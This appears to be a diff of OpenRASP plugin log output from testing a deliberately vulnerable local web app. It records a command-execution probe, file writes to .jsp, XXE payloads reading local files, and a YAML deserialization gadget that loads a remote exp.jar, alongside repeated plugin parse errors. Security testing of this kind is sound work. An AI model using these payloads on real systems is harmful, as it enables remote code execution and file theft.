+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,256 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,273 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,305 INFO  [http-nio-8002-exec-35][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,428 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,498 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,523 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,536 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,556 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,663 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,729 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,745 INFO  [http-nio-8002-exec-35][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:17,774 INFO  [http-nio-8002-exec-28][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:18,013 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:18,016 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:38:18,026 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:19,423 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Yaml/yaml.do <native code>:0
+"xml": "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://localhost:8888/exp.jar']]]]"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at get_all_parameter (official.js:1397:18)
+    at check_internal (official.js:1451:25)
+    at check_ssrf (official.js:1476:15)
+    at Object.func (official.js:1973:19)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:21,785 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesReadAllBytes.do <native code>:0
+"file": "/usr/share/locale/locale.alias"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2133:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:22,234 INFO  [http-nio-8002-exec-22][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/fileOutStreamWriteFile.do <native code>:0
+"file": "test.jsp", "content": "test"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2294:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:22,653 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/randomAccessFileWriteFile.do <native code>:0
+"file": "test.jsp", "content": "test"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2294:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:23,110 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesWrite.do <native code>:0
+"file": "test.jsp", "content": "test"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2294:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:23,451 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:23,468 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:23,798 INFO  [http-nio-8002-exec-28][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:24,268 INFO  [http-nio-8002-exec-35][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:24,441 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:24,506 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:24,694 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/listFile.do <native code>:0
+"dir": "/usr"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2078:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:24,711 INFO  [http-nio-8002-exec-22][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:24,716 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:24,775 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,149 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,164 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,192 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,212 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,263 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,333 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,462 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,586 INFO  [http-nio-8002-exec-28][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,693 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,697 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,699 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,729 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,755 INFO  [http-nio-8002-exec-13][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:25,946 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,013 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,043 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,064 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,065 INFO  [http-nio-8002-exec-11][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,096 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,146 INFO  [http-nio-8002-exec-5][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,164 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,177 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,242 INFO  [http-nio-8002-exec-35][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,532 INFO  [http-nio-8002-exec-26][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/ongl.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,533 INFO  [http-nio-8002-exec-28][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/ongl.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,534 INFO  [http-nio-8002-exec-3][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,563 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,577 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,595 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,612 INFO  [http-nio-8002-exec-25][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/deleteFile.do <native code>:0
+"file": "./1.txt"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,624 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,627 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/spEL.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,643 INFO  [http-nio-8002-exec-33][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,702 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/Expression/mvel.do official.js:919
+    for (; i < stacks.length; i++) {
+ReferenceError: stacks is not defined
+    at is_method_from_rasp (official.js:919:16)
+    at Object.func (official.js:2066:78)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,718 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,802 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,815 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,843 INFO  [http-nio-8002-exec-30][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:26,871 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,019 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,073 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,113 INFO  [http-nio-8002-exec-31][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,124 INFO  [http-nio-8002-exec-37][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,156 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,263 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,280 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,417 INFO  [http-nio-8002-exec-32][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,495 INFO  [http-nio-8002-exec-27][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,592 INFO  [http-nio-8002-exec-36][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,608 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/FileSystem/json/filesCopy.do <native code>:0
+"file": "1.txt", "dest": "1.jsp"}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2333:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,670 INFO  [http-nio-8002-exec-38][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,672 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/XXE/json/xerces.do <native code>:0
+"root":{"xml":"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>"}}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2078:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,796 INFO  [http-nio-8002-exec-34][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,902 INFO  [http-nio-8002-exec-6][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/cmd.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:27,933 INFO  [http-nio-8002-exec-12][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
+SyntaxError: Unexpected token : in JSON at position 5
+    at Object.func (official.js:2508:39)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,015 INFO  [http-nio-8002-exec-23][com.baidu.openrasp.plugin.js.log] http://localhost:8002/XXE/json/dom4j.do <native code>:0
+"root":{"xml":"<!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY title SYSTEM 'file:///usr' >]><article><title>&title;</title></article>"}}
+SyntaxError: Unexpected token : in JSON at position 6
+    at get_all_parameter (official.js:1397:18)
+    at Object.func (official.js:2078:29)
+    at Function.check (builtins.js:616:73)
+2024-05-06 23:39:28,119 INFO  [http-nio-8002-exec-17][com.baidu.openrasp.plugin.js.log] http://localhost:8002/CMD/json/unixProcess.do <native code>:0
+"cmd": "whoami"}
